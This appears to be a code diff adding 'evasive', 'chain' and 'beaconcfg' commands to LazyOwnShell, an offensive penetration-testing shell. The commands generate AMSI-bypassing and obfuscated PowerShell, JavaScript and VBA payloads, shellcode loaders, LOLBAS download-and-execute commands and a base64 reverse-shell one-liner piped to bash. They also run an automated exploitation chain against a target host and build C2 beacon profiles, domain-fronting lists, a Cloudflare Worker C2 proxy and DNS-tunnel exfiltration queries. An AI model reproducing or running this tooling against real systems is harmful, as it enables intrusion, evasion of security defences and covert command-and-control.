@@ -24548,6 +24548,250 @@ class LazyOwnShell(cmd2.Cmd):
         except Exception as exc:
             print_error(f"Report generation failed: {exc}")
 
+    def do_evasive(self, line: str) -> None:
+        """Generate detection-evading payloads with multiple obfuscation strategies.
+
+        Usage:
+            evasive ps <raw_payload>   Obfuscate a PowerShell payload (AMSI bypass + encoding)
+            evasive js <raw_payload>   Obfuscate a JavaScript payload
+            evasive vba <raw_payload>  Obfuscate a VBA macro payload
+            evasive rev <rhost> <rport> [python|bash|node]  Evasive reverse shell
+            evasive sc <b64_shellcode> [early_bird|virtualalloc]  Shellcode loader
+            evasive lolbas <payload_url> [technique]  LOLBAS execution
+            evasive poly <command> [iterations]  Polymorphic command mutation
+            evasive tech                 List all evasion techniques
+        """
+        from modules.evasive_payloads import EvasivePayloadGenerator
+
+        gen = EvasivePayloadGenerator()
+        parts = line.strip().split()
+        if not parts:
+            print_error("Usage: evasive <ps|js|vba|rev|sc|lolbas|poly|tech> [args...]")
+            return
+
+        subcmd = parts[0].lower()
+
+        if subcmd == "ps":
+            raw = " ".join(parts[1:])
+            if not raw:
+                print_error("Provide a PowerShell payload to obfuscate.")
+                return
+            obf = gen.generate_powershell_obfuscated(raw, obfuscation_level=3)
+            print_msg(obf)
+            copy2clip(obf)
+
+        elif subcmd == "js":
+            raw = " ".join(parts[1:])
+            if not raw:
+                print_error("Provide a JavaScript payload to obfuscate.")
+                return
+            obf = gen.generate_javascript_obfuscated(raw)
+            print_msg(obf)
+            copy2clip(obf)
+
+        elif subcmd == "vba":
+            raw = " ".join(parts[1:])
+            if not raw:
+                print_error("Provide a VBA macro to obfuscate.")
+                return
+            obf = gen.generate_vba_obfuscated(raw)
+            print_msg(obf)
+            copy2clip(obf)
+
+        elif subcmd == "rev":
+            rhost = parts[1] if len(parts) > 1 else self.params.get("rhost", "127.0.0.1")
+            rport = int(parts[2]) if len(parts) > 2 else self.params.get("rport", 4444)
+            technique = parts[3] if len(parts) > 3 else "python"
+            b64 = gen.generate_linux_evasive(rhost, rport, technique)
+            print_msg(f"echo {b64} | base64 -d | bash")
+            copy2clip(b64)
+
+        elif subcmd == "sc":
+            sc_b64 = parts[1] if len(parts) > 1 else ""
+            if not sc_b64:
+                print_error("Provide base64-encoded shellcode.")
+                return
+            technique = parts[2] if len(parts) > 2 else "early_bird_apc"
+            loader = gen.generate_shellcode_loader_powershell(sc_b64, technique)
+            print_msg(loader)
+            copy2clip(loader)
+
+        elif subcmd == "lolbas":
+            url = parts[1] if len(parts) > 1 else ""
+            if not url:
+                print_error("Provide a payload URL.")
+                return
+            technique = parts[2] if len(parts) > 2 else "mshta"
+            cmd, desc = gen.generate_lolbas_execution(url, technique)
+            print_msg(f"Technique: {desc}")
+            print_msg(f"Command: {cmd}")
+            copy2clip(cmd)
+
+        elif subcmd == "poly":
+            cmd = " ".join(parts[1:3]) if len(parts) > 1 else ""
+            iterations = int(parts[3]) if len(parts) > 3 else 5
+            if not cmd:
+                print_error("Provide a command to obfuscate.")
+                return
+            poly = gen.generate_polymorphic_command(cmd, iterations)
+            print_msg(poly)
+            copy2clip(poly)
+
+        elif subcmd == "tech":
+            techs = gen.list_techniques()
+            for category, items in techs.items():
+                print_msg(f"\n{category}:")
+                for item in items:
+                    print_msg(f"  - {item}")
+
+        else:
+            print_error(f"Unknown subcommand: {subcmd}")
+
+    def do_chain(self, line: str) -> None:
+        """Run autonomous exploitation chain: recon -> vuln -> exploit -> post-exploit.
+
+        Usage:
+            chain [rhost] [nmap_xml_path]   Analyze target and generate exploit plan
+            chain report                     Show last chain report
+
+        If no rhost is given, uses the current rhost from payload.json.
+        If no nmap_xml_path is given, auto-discovers all scan_*.nmap.xml in sessions/.
+        """
+        from modules.exploit_chain import ExploitChain
+
+        parts = line.strip().split()
+
+        if parts and parts[0] == "report":
+            rhost = self.params.get("rhost", "127.0.0.1")
+            report_path = f"sessions/exploit_chain_{rhost}.json"
+            if os.path.exists(report_path):
+                with open(report_path) as fh:
+                    print_msg(json.dumps(json.load(fh), indent=2))
+            else:
+                print_error(f"No report found: {report_path}")
+            return
+
+        rhost = parts[0] if parts else self.params.get("rhost", "127.0.0.1")
+        if rhost == "127.0.0.1" and not parts:
+            print_msg("No target specified, using 127.0.0.1 (localhost)")
+
+        nmap_path = parts[1] if len(parts) > 1 else f"sessions/scan_{rhost}.nmap"
+
+        chain = ExploitChain(
+            rhost=rhost,
+            lhost=self.params.get("lhost", "127.0.0.1"),
+            lport=self.params.get("lport", 4444),
+            sessions_dir="sessions",
+            nmap_xml_path=nmap_path if os.path.exists(nmap_path) else None,
+        )
+
+        services = chain.fingerprint_services()
+        print_msg(f"XML files scanned: {len(chain._discover_xml_files())}")
+        print_msg(f"Services discovered: {len(services)}")
+        if not services:
+            print_msg("  No open services found in nmap XML files.")
+            print_msg("  Try running: lazynmap  or  lazyscan")
+            return
+
+        for svc in services:
+            extra = ""
+            if svc.product:
+                extra += f" {svc.product}"
+            if svc.version:
+                extra += f" {svc.version}"
+            print_msg(f"  {svc.port}/{svc.protocol} {svc.name}{extra}")
+
+        vulns = chain.map_vulnerabilities()
+        print_msg(f"\nVulnerabilities matched: {len(vulns)}")
+        if not vulns:
+            print_msg("  No known vulnerabilities matched for the discovered services.")
+            pe = chain.get_post_exploit_commands("linux")
+            print_msg(f"\nPost-exploitation modules: {', '.join(pe)}")
+            chain.save_report()
+            return
+
+        for v in vulns:
+            print_msg(f"  [{v.severity.upper():8s}] {v.cve_id} - {v.description} ({v.service.port}/{v.service.protocol})")
+            if v.exploit_path:
+                print_msg(f"    Exploit module: {v.exploit_path}")
+            print_msg(f"    Confidence: {v.confidence:.0%}")
+            for ref in v.references:
+                print_msg(f"    Ref: {ref}")
+
+        plan = chain.generate_exploit_plan()
+        print_msg(f"\nExploitation Plan:")
+        for step in plan:
+            print_msg(f"  [{step['priority']}] {step['cve']} - {step['exploit_module']} => {step['expected_impact']}")
+
+        pe = chain.get_post_exploit_commands("linux")
+        print_msg(f"\nPost-exploitation modules: {', '.join(pe)}")
+
+        saved = chain.save_report()
+        print_msg(f"Report saved to {saved}")
+
+    def do_beaconcfg(self, line: str) -> None:
+        """Generate a C2 beacon profile with traffic morphing and domain fronting.
+
+        Usage:
+            beaconcfg generate [name]        Generate a malleable C2 profile
+            beaconcfg cdn [provider]         List CDN domains for fronting
+            beaconcfg worker <c2_host> <c2_port> [token]  Generate Cloudflare Worker proxy
+            beaconcfg dns <data> <domain>    Encode data as DNS tunnel queries
+        """
+        from modules.traffic_morpher import TrafficMorpher
+
+        tm = TrafficMorpher()
+        parts = line.strip().split()
+        if not parts:
+            print_error("Usage: beaconcfg <generate|cdn|worker|dns> [args...]")
+            return
+
+        subcmd = parts[0].lower()
+
+        if subcmd == "generate":
+            name = parts[1] if len(parts) > 1 else "default"
+            protocol = parts[2] if len(parts) > 2 else "https"
+            profile = tm.generate_beacon_profile(name=name, protocol=protocol)
+            print_msg(json.dumps(profile, indent=2))
+            path = f"sessions/beacon_profile_{name}.json"
+            with open(path, "w") as fh:
+                json.dump(profile, fh, indent=2)
+            print_msg(f"Profile saved to {path}")
+
+        elif subcmd == "cdn":
+            provider = parts[1] if len(parts) > 1 else "cloudflare"
+            domains = tm.get_cdn_fronting_hosts(provider, count=5)
+            print_msg(f"CDN fronting domains ({provider}):")
+            for d in domains:
+                print_msg(f"  {d}")
+
+        elif subcmd == "worker":
+            if len(parts) < 3:
+                print_error("Usage: beaconcfg worker <c2_host> <c2_port> [auth_token]")
+                return
+            c2_host, c2_port = parts[1], int(parts[2])
+            token = parts[3] if len(parts) > 3 else None
+            code = tm.generate_cloudflare_worker_proxy_config(c2_host, c2_port, token)
+            print_msg(code)
+            path = f"sessions/cf_worker_{c2_host}.js"
+            with open(path, "w") as fh:
+                fh.write(code)
+            print_msg(f"Worker code saved to {path}")
+            print_msg("Deploy with: npx wrangler deploy")
+
+        elif subcmd == "dns":
+            if len(parts) < 2:
+                print_error("Usage: beaconcfg dns <data> [domain]")
+                return
+            data = parts[1].encode()
+            domain = parts[2] if len(parts) > 2 else "cdn.cloudflare.net"
+            queries = tm.generate_dns_tunnel_payload(data, domain)
+            for q in queries:
+                print_msg(q)
+
+        else:
+            print_error(f"Unknown subcommand: {subcmd}")
+
 
 def main():
     if HEADLESS:
